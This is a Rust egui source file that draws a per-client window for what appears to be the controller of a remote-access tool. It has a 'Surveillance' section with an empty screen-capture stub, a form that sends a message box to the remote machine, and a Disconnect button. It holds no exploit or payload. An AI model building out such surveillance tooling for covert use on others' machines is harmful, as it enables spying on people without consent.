use crate::manager::types::UiManagerCommand;
use egui::{CollapsingHeader, Color32, Context, Frame, Margin, Stroke, Window};
use shared::commands::{Command, ComputerInfoResponse, MessageBoxArgs};
use tokio::sync::mpsc::UnboundedSender;

pub struct MsgboxView {
    pub title: String,
    pub text: String,
}
impl Default for MsgboxView {
    fn default() -> Self {
        Self {
            title: String::from("Title"),
            text: String::from("Text"),
        }
    }
}

pub struct ClientViewState {
    pub visible: bool,
    pub msgbox: MsgboxView,
}
pub struct ClientView {
    pub mutex: String,
    pub state: ClientViewState,
    //  pub socket: String, // socket
    pub info: ComputerInfoResponse,
    sender: UnboundedSender<UiManagerCommand>,
}
impl ClientView {
    pub fn new(
        /*socket: String,*/ mutex: String,
        info: ComputerInfoResponse,
        sender: UnboundedSender<UiManagerCommand>,
    ) -> Self {
        Self {
            mutex: mutex,
            state: ClientViewState {
                visible: false,
                msgbox: MsgboxView::default(),
            },
            // socket: socket,
            info: info,
            sender: sender,
        }
    }
}

pub fn render(ctx: &Context, view: &mut ClientView) {
    Window::new(view.info.hostname.clone())
        .open(&mut view.state.visible)
        .resizable(true)
        .show(ctx, |ui| {
            CollapsingHeader::new("Surveillance")
                .default_open(true)
                .show(ui, |ui| {
                    CollapsingHeader::new("Screen")
                        .default_open(false)
                        .show(ui, |_ui| { /* screen capture logic */ })
                });
            CollapsingHeader::new("Utility")
                .default_open(true)
                .show(ui, |ui| {
                    CollapsingHeader::new("MessageBox")
                        .default_open(false)
                        .show(ui, |ui| {
                            ui.text_edit_singleline(&mut view.state.msgbox.title);
                            ui.text_edit_multiline(&mut view.state.msgbox.text);

                            if ui.button("Send").clicked() {
                                let _ = view.sender.send(UiManagerCommand::SendCommand(
                                    view.mutex.clone(),
                                    Command::MessageBox(MessageBoxArgs {
                                        title: view.state.msgbox.title.clone(),
                                        text: view.state.msgbox.text.clone(),
                                    }),
                                ));
                            }
                        })
                });

            let disconnect = eframe::egui::Button::new("Disconnect")
                .fill(Color32::DARK_RED)
                .stroke(Stroke::new(1.0, Color32::BLACK));
            Frame::new().inner_margin(Margin::same(4)).show(ui, |ui| {
                if ui.add(disconnect).clicked() {
                    let _ = view
                        .sender
                        .send(UiManagerCommand::Disconnect(view.mutex.clone()));
                }
            })
        });
}
